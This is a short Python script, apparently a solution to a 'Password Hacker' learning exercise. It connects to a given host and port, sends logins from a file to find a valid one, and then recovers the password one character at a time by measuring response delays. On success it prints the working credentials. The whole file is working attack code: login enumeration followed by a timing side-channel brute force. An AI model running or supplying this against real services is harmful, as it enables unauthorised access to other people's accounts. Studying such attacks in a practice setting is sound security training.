import sys
import socket
import json
import time
from string import printable

args = sys.argv
hostname = args[1]
port = int(args[2])
logins = open("C:\\Users\\User\\Desktop\\Password Hacker\\logins.txt", 'r', encoding='utf-8')
user_data = {"login": "", "password": " "}
password = ''
f = open('delay.txt', 'a', encoding='utf-8')

client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)

for i in logins:
    login = i.strip()
    user_data["login"] = login
    request = json.dumps(user_data).encode()
    client_socket.send(request)
    start = time.perf_counter()
    response = json.loads(client_socket.recv(1024).decode())
    end = time.perf_counter()
    if response["result"] == "Wrong password!":
        break

d_time = end - start

while True:
    prev = d_time
    for ind, symbol in enumerate(printable):
        user_data["password"] = password + symbol
        request = json.dumps(user_data)
        client_socket.send(request.encode())
        start = time.perf_counter()
        response = json.loads(client_socket.recv(1024).decode())
        end = time.perf_counter()
        delay = end - start
        f.write(str(delay) + '\n')

        if 100 * prev < delay and response["result"] == "Wrong password!":
            f.write(str(delay) + ' right\n')
            password += symbol
            break
        elif response["result"] == "Connection success!":
            print(json.dumps(user_data))
            client_socket.close()
            exit()
        prev = delay
